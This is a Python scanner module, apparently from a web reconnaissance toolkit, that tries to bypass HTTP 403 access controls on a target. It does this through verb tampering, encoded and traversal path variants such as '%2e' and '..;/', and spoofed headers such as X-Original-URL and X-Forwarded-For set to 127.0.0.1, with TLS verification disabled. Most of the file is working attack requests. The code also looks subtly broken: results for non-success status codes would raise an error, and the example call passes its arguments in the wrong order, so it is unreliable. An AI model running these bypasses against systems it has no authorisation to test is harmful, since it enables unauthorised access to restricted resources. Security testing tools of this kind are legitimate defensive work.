import time
from .base_scanner import Scanner
from .utils import *
from typing import Any, Dict, List


#   --------------------------------------------------------------------------------------------------------------------
#
#   Attempt to bypass 403 using different methods
#
#   Ⓒ                                                                                                                Ⓒ
#   Ⓒ    This module was written in Python in order to integrate better with WebRecon, most methods were taken from  Ⓒ
#   Ⓒ    from this repo     ->      https://github.com/iamj0ker/bypass-403                                           Ⓒ
#   Ⓒ                                                                                                                Ⓒ
#
#   --------------------------------------------------------------------------------------------------------------------


class Bypass403(Scanner):
    _SCAN_COLOR = OutputColors.Blue
    _FOUND = 0
    _SUPPORTS_CACHE = False

    def __init__(self, target_keyword, *args, **kwargs):
        super().__init__(*args, **kwargs)

        self.target_url = self.target_url.strip("/")
        self.target_keyword = target_keyword.strip("/")

    def try_bypass(self) -> dict:
        results = {scode: list() for scode in ScannerDefaultParams.SuccessStatusCodes}

        # methods

        req_path = f"{self.target_url}/{self.target_keyword}"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        req_path = f"{self.target_url}/{self.target_keyword}"
        headers = {"Content-Length": "0"}
        results[self.send_request("POST", req_path, headers=headers)].append(f"POST {req_path} -H 'Content-Length: 0'")

        req_path = f"{self.target_url}/{self.target_keyword}"
        headers = {"Content-Length": "0"}
        results[self.send_request("PUT", req_path, headers=headers)].append(f"PUT {req_path} -H 'Content-Length: 0'")

        req_path = f"{self.target_url}/{self.target_keyword}"
        results[self.send_request("TRACE", req_path)].append(f"TRACE {req_path}")

        req_path = f"{self.target_url}/{self.target_keyword}"
        results[self.send_request("DELETE", req_path)].append(f"DELETE {req_path}")

        # encoding / path traversal

        req_path = f"{self.target_url}/%2e/{self.target_keyword}"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        req_path = f"{self.target_url}/{self.target_keyword}/."
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        req_path = f"{self.target_url}//{self.target_keyword}//"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        req_path = f"{self.target_url}/./{self.target_keyword}/./"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        req_path = f"{self.target_url}/{self.target_keyword}..;/"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        req_path = f"{self.target_url}/{self.target_keyword};/"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        req_path = f"{self.target_url}/{self.target_keyword}%20"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        req_path = f"{self.target_url}/{self.target_keyword}%09"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        req_path = f"{self.target_url}/{self.target_keyword}?"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        req_path = f"{self.target_url}/{self.target_keyword}#"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        req_path = f"{self.target_url}/{self.target_keyword}/*"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        # file extensions

        req_path = f"{self.target_url}/{self.target_keyword}.html"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        req_path = f"{self.target_url}/{self.target_keyword}.php"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        req_path = f"{self.target_url}/{self.target_keyword}.json"
        results[self.send_request("GET", req_path)].append(f"GET {req_path}")

        # headers

        req_path = f"{self.target_url}/{self.target_keyword}"
        headers = {"X-Original-URL": self.target_keyword}
        results[self.send_request("GET", req_path,
                                  headers=headers)].append(f"GET {req_path} -H 'X-Original-URL: {self.target_keyword}'")

        req_path = f"{self.target_url}/{self.target_keyword}"
        headers = {"X-Custom-IP-Authorization": "127.0.0.1"}
        results[self.send_request("GET", req_path,
                                  headers=headers)].append(f"GET {req_path} -H 'X-Custom-IP-Authorization: 127.0.0.1'")

        req_path = f"{self.target_url}/{self.target_keyword}"
        headers = {"X-Forwarded-For": "http://127.0.0.1"}
        results[self.send_request("GET", req_path,
                                  headers=headers)].append(f"GET {req_path} -H 'X-Forwarded-For: http://127.0.0.1'")

        req_path = f"{self.target_url}/{self.target_keyword}"
        headers = {"X-Forwarded-For": "127.0.0.1:80"}
        results[self.send_request("GET", req_path,
                                  headers=headers)].append(f"GET {req_path} -H 'X-Forwarded-For: 127.0.0.1:80'")

        req_path = f"{self.target_url}"
        headers = {"X-rewrite-url": self.target_keyword}
        results[self.send_request("GET", req_path,
                                  headers=headers)].append(f"GET {req_path} -H 'X-rewrite-url: {self.target_keyword}'")

        req_path = f"{self.target_url}/{self.target_keyword}"
        headers = {"X-Host": "127.0.0.1"}
        results[self.send_request("GET", req_path, headers=headers)].append(f"GET {req_path} -H 'X-Host: 127.0.0.1'")

        return results

    def send_request(self, method, path, headers=None) -> int:
        time.sleep(self.request_cooldown)
        return self._make_request(method=method, url=path, headers=headers,
                                  verify=False, allow_redirects=True).status_code

    def _start_scanner(self, results_filename=None) -> Dict[int, List[str]]:
        success_results = dict()
        self._log_status(OutputStatusKeys.State, OutputValues.StateRunning)
        all_results = self.try_bypass()

        for scode, req in all_results.items():
            if scode in ScannerDefaultParams.SuccessStatusCodes:
                success_results[scode] = req
                Bypass403._FOUND += 1
                self._log_status(OutputStatusKeys.Found, Bypass403._FOUND)

        return success_results

    def _define_status_output(self) -> Dict[str, Any]:
        status = dict()
        status[OutputStatusKeys.State] = OutputValues.StateSetup
        status[OutputStatusKeys.UsingCached] = OutputValues.BoolTrue if self._use_prev_cache else OutputValues.BoolFalse  # TODO method for general bool
        status[OutputStatusKeys.Current] = f"{self.target_url}/{self.target_keyword}"
        status[OutputStatusKeys.ResultsPath] = self.results_path_full
        status[OutputStatusKeys.Found] = Bypass403._FOUND

        return status


if __name__ == "__main__":
    bruter = Bypass403("https://owasp.org/", "/test")
    x = bruter.start_scanner()
    print(x)